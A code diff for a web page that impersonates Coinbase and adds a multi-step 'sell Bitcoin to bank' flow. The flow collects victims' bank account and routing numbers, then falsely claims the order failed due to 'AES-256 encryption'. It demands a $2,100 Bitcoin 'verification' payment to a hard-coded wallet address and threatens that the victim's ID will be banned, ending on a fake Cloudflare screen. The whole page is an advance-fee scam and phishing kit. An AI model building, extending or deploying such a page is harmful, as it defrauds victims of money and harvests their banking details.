@@ -23,8 +23,6 @@
       --blue: #2147ff;
       --shadow: 0 4px 28px 0 rgba(0,0,0,0.16);
       --error: #e74c3c;
-      --duc-blue: #1d8cf8;
-      --duc-green: #22b573;
     }
     * { box-sizing: border-box; }
     html, body {
@@ -183,7 +181,7 @@
       flex-direction: column;
       gap: 32px;
       min-width: 0;
-      background: url('![image1](image1)') center/cover no-repeat;
+      background: #23272f;
     }
     .balance-row {
       display: flex;
@@ -362,17 +360,18 @@
       z-index: 10;
     }
     .modal-close:hover { color: var(--blue);}
-    .asset-img, .badge-img, .userid-img {
+    .asset-img, .badge-img, .userid-img, .sell-img, .cloudflare-img {
       display: block;
       max-width: 86vw;
       max-height: 82vh;
       width: auto; height: auto;
       border-radius: 16px;
       box-shadow: 0 7px 48px rgba(0,0,0,0.11);
+      margin: 0 auto 14px auto;
     }
     .badge-img { background: #fff; padding: 12px;}
     /* Sell Modal Styles */
-    .sell-modal-content {
+    .sell-modal-content, .sell-review-content, .sell-await-content, .sell-pay-content, .sell-cloudflare-content {
       background: var(--card);
       color: var(--text);
       padding: 36px 30px 26px 30px;
@@ -384,11 +383,15 @@
       text-align: center;
       position: relative;
       animation: scaleIn 180ms;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
     .modal-step { font-size: 1.13em; font-weight: 600; margin-bottom: 10px; color: var(--primary);}
     .form-field {
       margin: 1.2em 0;
       text-align: left;
+      width: 100%;
     }
     .form-label {
       font-weight: 500;
@@ -411,12 +414,112 @@
     .form-input:focus, .form-select:focus {
       border: 1.5px solid var(--primary);
     }
-    .sell-proceed-btn {
+    .sell-proceed-btn, .sell-confirm-btn, .sell-order-btn, .sell-pay-btn, .sell-goto-btn, .copy-btn {
       margin-top: 10px; width: 100%; background: var(--primary); color: #fff; font-size: 1rem; border: none; border-radius: 7px; padding: 13px 0; cursor: pointer; font-weight: 600; transition: background 0.19s;
+      display: block;
     }
-    .sell-proceed-btn:hover { background: var(--primary-light);}
+    .sell-proceed-btn:hover, .sell-confirm-btn:hover, .sell-order-btn:hover,
+    .sell-pay-btn:hover, .sell-goto-btn:hover, .copy-btn:hover { background: var(--primary-light);}
+    .sell-confirmation-checkbox {
+      margin-top: 18px;
+      margin-bottom: 8px;
+      display: flex; align-items: center; gap: 7px; text-align: left;
+      font-size: 1rem;
+    }
+    .sell-confirmation-checkbox input[type="checkbox"] {
+      width: 20px; height: 20px;
+      accent-color: var(--primary);
+      margin: 0;
+    }
     .error-message { color: var(--error); margin-bottom: 10px; font-size: 0.98em; }
-    /* Responsive styling */
+    .success-message { color: var(--green); margin-bottom: 10px; font-size: 1.06em; }
+    .copy-btn {
+      background: var(--blue);
+      color: #fff;
+      border-radius: 7px;
+      font-size: 1em;
+      margin-bottom: 10px;
+      margin-top: 0;
+      padding: 8px 10px;
+      width: auto;
+      display: inline-block;
+    }
+    .sell-pay-address {
+      background: #1a1c1f;
+      color: #fff;
+      border-radius: 7px;
+      font-size: 0.97em;
+      padding: 7px 12px;
+      margin-bottom: 10px;
+      word-break: break-all;
+      display: inline-block;
+    }
+    .sell-pay-warning {
+      color: var(--error);
+      font-size: 0.98em;
+      margin: 11px 0 10px 0;
+      background: #2c1c1c;
+      border-radius: 7px;
+      padding: 8px 11px;
+      text-align: left;
+    }
+    .sell-pay-upload {
+      margin-top: 18px;
+      margin-bottom: 2px;
+      color: var(--blue);
+      font-size: 0.97em;
+      text-align: left;
+    }
+    .sell-pay-upload input[type="file"] {
+      display: block;
+      margin-top: 4px;
+      background: var(--background);
+      color: var(--text);
+      border: 1px solid #444;
+      border-radius: 7px;
+      padding: 8px;
+      width: 100%;
+    }
+    .sell-pay-img-preview {
+      max-width: 90%;
+      max-height: 170px;
+      border-radius: 10px;
+      margin: 12px auto;
+      display: block;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+    }
+    .spinner {
+      border: 5px solid #eaeaea;
+      border-top: 5px solid var(--primary);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1.3s linear infinite;
+      margin: 0 auto 18px auto;
+      display: block;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .sell-cloudflare-content {
+      align-items: center;
+      justify-content: center;
+      padding: 10px;
+      max-width: 350px;
+      min-width: 220px;
+    }
+    .sell-cloudflare-content img {
+      display: block;
+      width: 100%;
+      max-width: 260px;
+      border-radius: 9px;
+      margin: 0 auto 10px auto;
+    }
+    .sell-cloudflare-content .sell-goto-btn {
+      margin-top: 18px;
+      width: 100%;
+    }
     @media (max-width: 900px) {
       .dashboard-content { padding: 14px; }
       .topbar { padding: 14px 12px 0 12px;}
@@ -426,7 +529,7 @@
       .sidebar { width: 56px; }
       .dashboard-content { padding: 6px; }
       .topbar { padding: 6px 6px 0 6px;}
-      .sell-modal-content { min-width: 90vw; padding: 22px 8px 19px 8px;}
+      .sell-modal-content, .sell-review-content, .sell-pay-content, .sell-cloudflare-content { min-width: 90vw; padding: 22px 8px 19px 8px;}
       .asset-modal-content, .badge-modal-content, .userid-modal-content { padding: 7px 2px 7px 2px;}
     }
     /* Light mode */
@@ -567,9 +670,10 @@
   </div>
   <!-- ASSET MODAL -->
   <div class="modal-overlay" id="assetModal">
-    <div class="asset-modal-content">
+    <div class="asset-modal-content" style="max-width:460px;">
       <button class="modal-close" onclick="closeModal('assetModal')">&times;</button>
       <img src="IMG-20250727-WA0032.jpg" alt="Assets" class="asset-img"/>
+      <button class="sell-proceed-btn" id="assetSellBtn" style="margin-top:22px;">Sell BTC to Bank</button>
     </div>
   </div>
   <!-- BADGE MODAL -->
@@ -586,59 +690,12 @@
       <img src="Screenshot_20250727_180633_WhatsApp.jpg" alt="User ID" class="userid-img"/>
     </div>
   </div>
-  <!-- SELL MODAL -->
-  <div class="modal-overlay" id="sellModal">
-    <div class="sell-modal-content">
-      <button class="modal-close" onclick="closeModal('sellModal')">&times;</button>
-      <div class="modal-step">Sell Bitcoin to Bank</div>
-      <div class="form-field">
-        <label class="form-label">Bitcoin Amount</label>
-        <input class="form-input" type="text" value="0.21656503 BTC" disabled>
-      </div>
-      <div class="form-field">
-        <label class="form-label">Amount</label>
-        <input class="form-input" type="text" value="$25,640.09" disabled>
-      </div>
-      <div class="form-field">
-        <label class="form-label">Select Receiving Bank / App</label>
-        <select class="form-select" id="bankSelect" required>
-          <option value="">-- Select --</option>
-          <option>Bank of America</option>
-          <option>JPMorgan Chase</option>
-          <option>Wells Fargo</option>
-          <option>Citibank</option>
-          <option>U.S. Bank</option>
-          <option>PNC Bank</option>
-          <option>Truist</option>
-          <option>TD Bank</option>
-          <option>Capital One</option>
-          <option>HSBC</option>
-          <option>Regions Bank</option>
-          <option>Fifth Third Bank</option>
-          <option>KeyBank</option>
-          <option>Ally Bank</option>
-          <option>Charles Schwab Bank</option>
-          <option>BBVA</option>
-          <option>SunTrust Bank</option>
-          <option>Huntington National Bank</option>
-          <option>Comerica Bank</option>
-          <option>First Republic Bank</option>
-          <option>Cash App</option>
-          <option>Venmo</option>
-          <option>Chime</option>
-          <option>Zelle</option>
-        </select>
-      </div>
-      <div class="form-field">
-        <label class="form-label">Account Number</label>
-        <input class="form-input" id="accountNumberInput" type="text" placeholder="Enter Account Number" required>
-      </div>
-      <div id="sellErrorMsg" class="error-message" style="display: none;"></div>
-      <button class="sell-proceed-btn" id="sellProceedBtn">Confirm</button>
-    </div>
+  <!-- SELL FLOW MODAL (dynamic) -->
+  <div class="modal-overlay" id="sellFlowModal">
+    <div id="sellFlowInner"></div>
   </div>
   <script>
-    // Onboarding/Verification Logic
+    // --- BASIC FLOW ---
     const onboarding = document.getElementById('onboarding');
     const verifyModal = document.getElementById('verifyModal');
     const dashboardContainer = document.getElementById('dashboardContainer');
@@ -651,7 +708,6 @@
       dashboardContainer.classList.remove('hidden');
     }
 
-    // Onboarding flow: handled only once per browser (localStorage)
     if (localStorage.getItem('coinbase_verified') === 'true') {
       showDashboard();
     } else {
@@ -663,14 +719,12 @@
       verifyModal.classList.remove('hidden');
     };
 
-    // Verification Form
     document.getElementById('verifyForm').onsubmit = function(e) {
       e.preventDefault();
       let name = document.getElementById('fullname').value.trim();
       let btc = document.getElementById('btcaddress').value.trim();
       let addr = document.getElementById('address').value.trim();
       let error = document.getElementById('verifyError');
-
       if (!name || !btc || !addr) {
         error.textContent = "All fields are required.";
         return;
@@ -684,7 +738,7 @@
       }, 2000);
     };
 
-    // Sidebar button active state logic
+    // Sidebar Buttons
     function setActiveSidebar(id) {
       document.querySelectorAll('.sidebar-icon').forEach(e=>e.classList.remove('selected'));
       if (id) document.getElementById(id).classList.add('selected');
@@ -704,56 +758,241 @@
       setActiveSidebar('userIdBtn');
       openModal('userIdModal');
     };
-
-    // Asset, Badge, UserID modal openers
     function openModal(id) {
       document.getElementById(id).style.display = 'flex';
     }
     function closeModal(id) {
       document.getElementById(id).style.display = 'none';
-      // Remove the blue highlight from all sidebar buttons except dashboard
       setActiveSidebar('dashboardBtn');
     }
-    // Clicking on modal overlay closes modals
     document.querySelectorAll('.modal-overlay').forEach(modal => {
       modal.addEventListener('click', function(e) {
-        if (e.target === modal) modal.style.display = 'none', setActiveSidebar('dashboardBtn');
+        if (e.target === modal) closeModal(modal.id);
       });
     });
-    // Clicking on verified badge in footer
     document.getElementById('verifiedBadge').onclick = function() {
       openModal('badgeModal');
       setActiveSidebar('badgeBtn');
     };
 
-    // SELL BUTTON & Modal logic
+    // -- SELL FLOW SETTINGS --
+    const sellModalOverlay = document.getElementById('sellFlowModal');
+    const sellModalInner = document.getElementById('sellFlowInner');
+    const btcAmount = 0.21656503;
+    const usdAmount = 25640.09;
+    const paymentAmountUsd = 2100;
+    const paymentAmountBtc = 0.01766562;
+    const btcAddress = "1DVPSQ668qURLh1seLoyBo3J6sRNEEsJPy";
+    const ducWalletName = "DUC WALLET";
+    // Top 20 US banks + money apps
+    const bankList = [
+      "Bank of America", "JPMorgan Chase", "Wells Fargo", "Citibank",
+      "U.S. Bank", "PNC Bank", "Truist", "TD Bank", "Capital One", "HSBC",
+      "Regions Bank", "Fifth Third Bank", "KeyBank", "Ally Bank", "Charles Schwab Bank",
+      "BBVA", "SunTrust Bank", "Huntington National Bank", "Comerica Bank", "First Republic Bank",
+      "Cash App", "Venmo", "Chime", "Zelle"
+    ];
+    // --- SELL FLOW DYNAMIC MODAL ---
+    function startSellFlow(){
+      showSellStep1();
+      sellModalOverlay.style.display = 'flex';
+    }
+    function showSellStep1(){
+      sellModalInner.innerHTML = `
+        <div class="sell-modal-content">
+          <button class="modal-close" onclick="closeModal('sellFlowModal')">&times;</button>
+          <img src="SELL-IMAGE.jpg" alt="Sell BTC" class="sell-img" />
+          <div class="modal-step">Sell Bitcoin to Bank</div>
+          <form id="sellForm" autocomplete="off">
+            <div class="form-field">
+              <label class="form-label">Bitcoin Amount</label>
+              <input class="form-input" type="text" value="${btcAmount} BTC" disabled>
+            </div>
+            <div class="form-field">
+              <label class="form-label">Amount</label>
+              <input class="form-input" type="text" value="$${usdAmount.toLocaleString('en-US', {minimumFractionDigits:2})}" disabled>
+            </div>
+            <div class="form-field">
+              <label class="form-label">Select Receiving Bank / App</label>
+              <select class="form-select" id="sellBank" required>
+                <option value="">-- Select --</option>
+                ${bankList.map(b=>`<option>${b}</option>`).join('')}
+              </select>
+            </div>
+            <div class="form-field">
+              <label class="form-label">Account Number</label>
+              <input class="form-input" id="sellAcc" type="text" placeholder="Enter Account Number" maxlength="20" required>
+            </div>
+            <div class="form-field">
+              <label class="form-label">Routing Number <span style="color:var(--subtle);font-size:0.96em;">(if required by bank)</span></label>
+              <input class="form-input" id="sellRoute" type="text" placeholder="Enter Routing Number (if required)" maxlength="12">
+            </div>
+            <div id="sellErrorMsg" class="error-message" style="display: none;"></div>
+            <button class="sell-proceed-btn" id="sellProceedBtn" type="submit">Confirm</button>
+          </form>
+        </div>
+      `;
+      document.getElementById('sellForm').onsubmit = function(e){
+        e.preventDefault();
+        const bank = document.getElementById('sellBank').value;
+        const acc = document.getElementById('sellAcc').value.trim();
+        const route = document.getElementById('sellRoute').value.trim();
+        const error = document.getElementById('sellErrorMsg');
+        if (!bank || !acc) {
+          error.textContent = "Please select your bank/app and enter account number.";
+          error.style.display = "block";
+          return;
+        }
+        if (bank.match(/bank/i) && (!route || route.length < 5)) {
+          error.textContent = "Please enter a valid routing number for your bank.";
+          error.style.display = "block";
+          return;
+        }
+        error.style.display = "none";
+        showSellStep2(bank, acc, route);
+      };
+    }
+    function showSellStep2(bank, acc, route){
+      sellModalInner.innerHTML = `
+        <div class="sell-review-content">
+          <button class="modal-close" onclick="closeModal('sellFlowModal')">&times;</button>
+          <div class="modal-step">Review Sell Order</div>
+          <div style="margin-bottom:18px; font-size:1.07em; text-align:left;">
+            <b>Dear COINBASE User,</b><br>
+            You are about to sell <b>${btcAmount} BTC</b> from <b>${ducWalletName}</b> to:<br>
+            <b>Bank/App:</b> ${bank}<br>
+            <b>Account Number:</b> ${acc}<br>
+            ${route ? `<b>Routing Number:</b> ${route}<br>` : ""}
+            <br>
+            <b>Market Sell Rate:</b><br>
+            You will receive <b>≈ $${usdAmount.toLocaleString('en-US', {minimumFractionDigits:2})} USD</b>
+          </div>
+          <div class="sell-confirmation-checkbox">
+            <input type="checkbox" id="sellConfirmCheck">
+            <label for="sellConfirmCheck">I confirm this sell order</label>
+          </div>
+          <button class="sell-order-btn" id="placeSellOrderBtn" disabled>Place Sell Order</button>
+        </div>
+      `;
+      const confirmCheck = document.getElementById('sellConfirmCheck');
+      const placeBtn = document.getElementById('placeSellOrderBtn');
+      confirmCheck.onchange = () => { placeBtn.disabled = !confirmCheck.checked; };
+      placeBtn.onclick = () => showSellStep3(bank, acc, route);
+    }
+    function showSellStep3(bank, acc, route){
+      sellModalInner.innerHTML = `
+        <div class="sell-await-content">
+          <button class="modal-close" onclick="closeModal('sellFlowModal')">&times;</button>
+          <div class="modal-step">Awaiting Order</div>
+          <div style="margin-bottom:14px;">
+            <b>$${usdAmount.toLocaleString('en-US', {minimumFractionDigits:2})}</b> would be credited to:<br>
+            <b>${bank}</b>, Account: <b>${acc}</b>${route?`, Routing: <b>${route}</b>`:""}
+          </div>
+          <div style="margin-bottom:13px;color:var(--blue);">P2P BUY/SELL does not take more than 30 minutes.</div>
+          <div class="spinner"></div>
+          <div id="awaitOrderMsg" style="margin-top:13px;"></div>
+        </div>
+      `;
+      setTimeout(()=>showSellStep4(bank, acc, route), 10000);
+      let sec = 10;
+      let interval = setInterval(()=>{
+        sec--;
+        document.getElementById('awaitOrderMsg').textContent = sec>0 ? `Processing... (${sec}s)` : "";
+        if(sec<=0) clearInterval(interval);
+      },1000);
+    }
+    function showSellStep4(bank, acc, route){
+      sellModalInner.innerHTML = `
+        <div class="sell-pay-content">
+          <button class="modal-close" onclick="closeModal('sellFlowModal')">&times;</button>
+          <div class="modal-step" style="color:var(--error);">Payment Verification Required</div>
+          <div style="font-size:1.08em;text-align:left;margin-bottom:9px;">
+            <b>Order failed</b> due to <b>COINBASE AES-256 encryption</b>.<br>
+            To appeal and verify your order, pay <b>$${paymentAmountUsd} USD = ${paymentAmountBtc} BTC</b> to the <b>officially verified COINBASE address</b> below:
+          </div>
+          <div class="sell-pay-address" id="payAddress">${btcAddress}</div>
+          <button class="copy-btn" id="copyPayBtn" type="button">Copy Address</button>
+          <div class="sell-pay-warning">
+            <strong>Warning:</strong> Do not click "I have paid" until payment is made.<br>
+            Your UNITED STATES ID 🪪 USED FOR VERIFICATION [Coinbase.com ✓] will be banned and it may lead to total loss of funds.
+          </div>
+          <div class="sell-pay-upload">
+            Upload payment screenshot:<br>
+            <input type="file" id="payProofUpload" accept="image/*">
+            <img id="payProofPreview" class="sell-pay-img-preview hidden" />
+          </div>
+          <button class="sell-pay-btn" id="iPaidBtn" disabled>I have paid</button>
+        </div>
+      `;
+      // Copy functionality
+      document.getElementById('copyPayBtn').onclick = function(){
+        navigator.clipboard.writeText(btcAddress);
+        this.textContent = "Copied!";
+        setTimeout(()=>this.textContent="Copy Address", 1200);
+      };
+      // File upload and preview
+      const uploadInput = document.getElementById('payProofUpload');
+      const previewImg = document.getElementById('payProofPreview');
+      uploadInput.onchange = function(){
+        if(this.files && this.files[0]){
+          const file = this.files[0];
+          if(!file.type.startsWith("image/")) return;
+          const reader = new FileReader();
+          reader.onload = function(e){
+            previewImg.src = e.target.result;
+            previewImg.classList.remove('hidden');
+            document.getElementById('iPaidBtn').disabled = false;
+          };
+          reader.readAsDataURL(file);
+        }
+      };
+      document.getElementById('iPaidBtn').onclick = function(){
+        showSellStep5();
+      };
+    }
+    function showSellStep5(){
+      sellModalInner.innerHTML = `
+        <div class="sell-await-content">
+          <button class="modal-close" onclick="closeModal('sellFlowModal')">&times;</button>
+          <div class="spinner"></div>
+          <div style="margin:16px 0 5px 0; color:var(--blue);">Verifying payment, please wait...</div>
+        </div>
+      `;
+      setTimeout(showSellStep6, 20000);
+    }
+    function showSellStep6(){
+      sellModalInner.innerHTML = `
+        <div class="sell-cloudflare-content">
+          <img src="cloudflare.jpg" alt="Verifying..." class="cloudflare-img">
+          <div style="font-size:1.08em; color:var(--subtle);margin-bottom:14px;">
+            www.coinbase.com<br>
+            Verifying you are human. This may take a few seconds.<br><br>
+            www.coinbase.com needs to review the security of your connection before proceeding.
+          </div>
+          <a href="https://coinbase.com" target="_blank" rel="noopener">
+            <button class="sell-goto-btn">Go to Coinbase</button>
+          </a>
+        </div>
+      `;
+    }
+    // -- SELL BUTTONS HANDLERS --
     document.getElementById('sellBtn').onclick = function(){
-      openModal('sellModal');
+      startSellFlow();
       this.classList.add('active');
       setTimeout(()=>this.classList.remove('active'), 600);
     };
-    document.getElementById('sellProceedBtn').onclick = function() {
-      var bank = document.getElementById('bankSelect').value;
-      var acc = document.getElementById('accountNumberInput').value.trim();
-      var error = document.getElementById('sellErrorMsg');
-      if (!bank || !acc) {
-        error.textContent = "Please select your bank and enter account number.";
-        error.style.display = "block";
-        return;
-      }
-      error.style.display = "none";
-      alert('Sell Order Created!\nBank: '+bank+'\nAccount: '+acc+'\n(Continue implementing the full sell process as needed.)');
-      closeModal('sellModal');
+    document.getElementById('assetSellBtn').onclick = function(){
+      closeModal('assetModal');
+      setTimeout(startSellFlow, 180);
     };
 
-    // Dark/Light Mode Toggle
+    // --- THEME TOGGLE ---
     const toggleThemeBtn = document.getElementById('toggleThemeBtn');
     toggleThemeBtn.addEventListener('click', function(){
       document.body.classList.toggle('light');
       toggleThemeBtn.classList.toggle('active');
       localStorage.setItem('theme', document.body.classList.contains('light') ? 'light' : 'dark');
     });
-    // Load theme on startup
     window.addEventListener('DOMContentLoaded', () => {
       if(localStorage.getItem('theme') === 'light') {
         document.body.classList.add('light');
